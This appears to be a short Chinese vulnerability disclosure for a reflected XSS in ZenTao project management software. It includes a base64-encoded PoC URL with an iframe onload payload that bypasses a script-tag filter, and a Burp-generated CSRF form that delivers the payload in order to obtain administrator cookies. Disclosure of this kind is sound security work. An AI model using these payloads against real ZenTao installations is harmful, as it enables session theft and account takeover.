# 禅道全版本存在跨站脚本攻击(XSS)

说明：禅道项目管理软件是开源项目管理软件。其最新版（企业版<=5.0.rc1，专业版<=10.0.rc1,开源版<=15.0）存在跨站脚本攻击。用户无需登录，可构造poc，获取管理员cookie.
条件：/config/my.php设置$config->requestType= 'GET'

## 1.poc

poc:
```
/index.php?m=user&f=login&t=json&referer=L2luZGV4LnBocD9tPXVzZXImZj0xJnQ9anNvbiZyZWZlcmVyPTxpZnJhbWUgb25sb2FkPSdhbGVydChkb2N1bWVudC5jb29raWUpJz4=
```

![img](1.png)
此处采用过滤了```<script>```,采用```<iframe onload='alert(document.cookie)'>```可以绕过

## 2.危害
可结合csrf构造攻击链：
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://ip:8002/index.php">
      <input type="hidden" name="m" value="user" />
      <input type="hidden" name="f" value="login" />
      <input type="hidden" name="t" value="json" />
      <input type="hidden" name="referer" value="L2luZGV4LnBocD9tPXVzZXImZj0xJnQ9anNvbiZyZWZlcmVyPTxpZnJhbWUgb25sb2FkPSdhbGVydChkb2N1bWVudC5jb29raWUpJz4&#61;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
![img](2.png)

通过点击或者其他方式获取cookie
![img](3.png)
